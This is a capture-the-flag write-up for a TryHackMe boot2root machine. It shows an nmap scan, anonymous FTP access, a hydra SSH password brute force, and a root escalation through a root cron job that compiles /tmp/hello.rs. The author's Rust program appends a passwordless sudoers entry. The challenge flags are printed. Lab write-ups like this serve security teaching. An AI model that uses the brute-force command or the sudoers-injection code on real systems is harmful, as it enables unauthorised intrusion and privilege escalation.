---
description: https://tryhackme.com/room/yctfweek2Mv
---

# VM - boot2root

i had first blood for this machine ([🩸](https://emojipedia.org/drop-of-blood))

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

## Port scan

* i used rustscan to see what ports are open (21 and 22)
* nmap scan results :

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.102.180
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Dec 04 23:26 welcome.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 28:fa:d2:43:4e:e7:6c:1f:49:19:f3:3f:ae:8c:e2:00 (RSA)
|   256 48:57:12:7e:c2:10:4d:0d:1f:1a:d6:65:f5:4e:a6:7f (ECDSA)
|_  256 93:b2:43:81:5f:0c:73:af:84:b1:45:ba:21:ac:c2:54 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
```

* only 2 ports were open,

## FTP&#x20;

* anonymous login was allowed

```bash
└─➜ ftp 10.10.103.104                                                                                                                                                                    [1]
Connected to 10.10.103.104.
220 (vsFTPd 3.0.5)
Name (10.10.103.104:kyubi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Dec 04 23:26 welcome.txt
226 Directory send OK.

ftp> get welcome.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for welcome.txt (69 bytes).
226 Transfer complete.
69 bytes received in 0.0013 seconds (52 kbytes/s)

ftp> bye
221 Goodbye.
```

### Contents of welcome.txt

```bash
Hello I am melodi and welcome to my simple FTP server.

Thank You :)
```

* Username : melodi

## SSH&#x20;

* since no http port was open, my next thought was to **bruteforce** the password

### hydra bruteforce

```bash
└─➜ hydra -l melodi -P /usr/share/wordlists/rockyou.txt 10.10.103.104 ssh -t 4                                                                                                           [0]
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-10 12:37:16
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.103.104:22/
[STATUS] 81.00 tries/min, 81 tries in 00:01h, 14344317 to do in 2951:31h, 4 active
[22][ssh] host: 10.10.103.104   login: melodi   password: princess1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-10 12:38:56

```

### Password found : princess1



## User flag

```bash
└─➜ ssh melodi@10.10.103.104                                                                                                                                                           [130]
The authenticity of host '10.10.103.104 (10.10.103.104)' can't be established.
ED25519 key fingerprint is SHA256:G7f5Il1Yitj0F1y5OmeYSgwUVJbsq01WBas04KF+LPo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:36: 10.10.224.19
    ~/.ssh/known_hosts:38: 10.10.211.116
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.103.104' (ED25519) to the list of known hosts.
melodi@10.10.103.104's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Dec  7 18:33:34 2023
melodi@ubuntu:~$ ls
fl4g.txt
melodi@ubuntu:~$ cat fl4g.txt
YCTF{15_1t_e45y??}

```

### Flag : YCTF{15\_1t\_e45y??}



## Root flag

* I used **pspy64** script to see what all proccess were running on the machine

```bash
2023/12/09 19:35:01 CMD: UID=0     PID=14136  | /root/.cargo/bin/rustc /tmp/hello.rs
2023/12/09 19:35:01 CMD: UID=0     PID=14135  | /bin/bash /root/script.sh
2023/12/09 19:35:01 CMD: UID=0     PID=14134  | /bin/sh -c /bin/bash /root/script.sh
2023/12/09 19:35:01 CMD: UID=0     PID=14133  | /usr/sbin/CRON -f
```

* every minute root compiles the script under `/tmp/hello.rs` and (runs it?)
* Let's add ourself in sudoers list (NOTE: this isn't the way i solved this machine)
* before :&#x20;

```bash
melodi@ubuntu:/tmp$ sudo -l
[sudo] password for melodi:
Sorry, user melodi may not run sudo on ubuntu.
```

* script :&#x20;

```rust
use std::fs::OpenOptions;
use std::io::{self, Write};
use std::path::Path;

fn main() {
    let username = "melodi";

    // Path to the sudoers file
    let sudoers_path = "/etc/sudoers";

    // Check if the file exists
    if !Path::new(sudoers_path).exists() {
        eprintln!("Error: sudoers file not found at {}", sudoers_path);
        return;
    }

    // Open the sudoers file for appending
    let mut file = match OpenOptions::new().append(true).open(sudoers_path) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("Error opening sudoers file: {}", err);
            return;
        }
    };

    // Prepare the line to be added to the sudoers file
    let sudoers_line = format!("{}   ALL=(ALL:ALL) NOPASSWD: ALL\n", username);

    // Write the line to the sudoers file
    match file.write_all(sudoers_line.as_bytes()) {
        Ok(_) => println!("Passwordless sudo access added for user: {}", username),
        Err(err) => eprintln!("Error writing to sudoers file: {}", err),
    }
}
```

* After a minute our script will be run by the root user

```bash
melodi@ubuntu:/tmp$ sudo -l
Matching Defaults entries for melodi on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User melodi may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

* woo hooooo, we can run sudo now, without any password

```bash
melodi@ubuntu:/tmp$ sudo /bin/bash
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/tmp# cd /root
root@ubuntu:~# ls
r00t.txt  script.sh
root@ubuntu:~# cat r00t.txt
YCTF{1t5_v3ry_ru5ty_h3r3!!}
```

* btw i used another script during CTF, a script that had rev shell payload for my local machine, i listen on my local machine with netcat and got root shell.

### Flag: YCTF{1t5\_v3ry\_ru5ty\_h3r3!!}

## Pwned

\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning
